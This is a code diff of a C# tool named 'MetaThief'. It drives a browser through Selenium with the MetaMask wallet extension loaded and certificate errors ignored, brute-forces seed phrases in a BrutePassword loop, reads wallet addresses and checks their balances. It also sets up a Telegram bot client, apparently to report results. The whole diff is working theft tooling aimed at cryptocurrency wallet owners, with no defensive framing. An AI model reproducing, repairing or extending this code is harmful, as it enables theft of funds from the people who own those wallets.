@@ -19,36 +19,13 @@ namespace MetaThief
             string path = @"C:\Users\79956\Downloads\metamask.crx";
             Byte[] bytes = System.IO.File.ReadAllBytes(path);
             string file = Convert.ToBase64String(bytes);
-            //ChromeOptions options = new ChromeOptions();
-            //options.AddEncodedExtension(file);
-            //options.AddArgument("user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36");
-            //options.AddArgument("disable-geolocation");
-            //options.AddArgument("ignore-certificate-errors");
-            //options.AddArgument("disable-popup-blocking");
-            //options.AddArgument("disable-web-security");
-            //options.AddArgument("--disable-infobars");
-            //options.AddArgument("disable-translate");
 
-            //Console.Write("Enter file id: ");
-            //int seeds = Int32.Parse(Console.ReadLine());
-            //string path = @"C:\Users\79956\Downloads\metamask-10.12.4-an+fx.xpi";
-            //Byte[] bytes = System.IO.File.ReadAllBytes(path);
-            //string file = Convert.ToBase64String(bytes);
-            EdgeOptions options = new EdgeOptions();
-
-            /*options.add
+            ChromeOptions options = new ChromeOptions();
             options.AddEncodedExtension(file);
-            options.AddArgument("user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36");
-            options.AddArgument("disable-geolocation");
             options.AddArgument("ignore-certificate-errors");
-            options.AddArgument("disable-popup-blocking");
-            options.AddArgument("disable-web-security");
-            options.AddArgument("--disable-infobars");
-            options.AddArgument("disable-translate");*/
-            options.AddEncodedExtensions(file);
-            //Thread.Sleep(60 * 1000);
-            IWebDriver driver = new EdgeDriver(options);
-            /*IWebDriver driver = new ChromeDriver(options);*/
+            options.AddArgument("ignore-ssl-errors");
+
+            IWebDriver driver = new ChromeDriver(options);
             Pirate pirate = new Pirate(driver, 10);
             pirate.Process();
         }
@@ -87,14 +64,13 @@ namespace MetaThief
                 try
                 {
                     IWebElement element = driver.FindElement(By.CssSelector(path));
-                    //element.Click();
 
                     if (text != "") element.SendKeys(text);
                     succces = true;
                 }
                 catch (Exception e)
                 {
-                    //adsfasdf
+                    //exception
                 }
             }
         }
@@ -122,7 +98,7 @@ namespace MetaThief
         public async void Process()
         {
             client = new TelegramBotClient(token);
-            driver.Navigate().GoToUrl("extension://nkbihfbeogaeaoehlefnkodbefgpgknn/home.html#initialize/welcome");
+            driver.Navigate().GoToUrl("https://google.com");
             driver.Close();
 
             var AftertTabs = driver.WindowHandles.ToList();
@@ -153,7 +129,7 @@ namespace MetaThief
                 }
                 catch (Exception e)
                 {
-                    //adsfasdf
+                    //exception
                 }
             }
         }
@@ -178,9 +154,6 @@ namespace MetaThief
 
         public void BrutePassword()
         {
-            /*StreamReader sr = new StreamReader(@"D:\Словесная база\base.txt", System.Text.Encoding.Default);
-            string[] array = sr.ReadToEnd().Split("\n");*/
-
             var success = false;
             var seed = "";
             while (!success)
@@ -247,7 +220,7 @@ namespace MetaThief
             IWebElement element = driver.FindElement(By.CssSelector("#app-content > div > span > div.modal > div > div > div > div.qr-code > div.qr-code__address-container__tooltip-wrapper > div > div > div.qr-code__address"));
             var address = element.Text.ToString();
 
-            GetBalanceAsync(address, seed);
+            _ = GetBalanceAsync(address, seed);
             found = true;
             password = false;
 
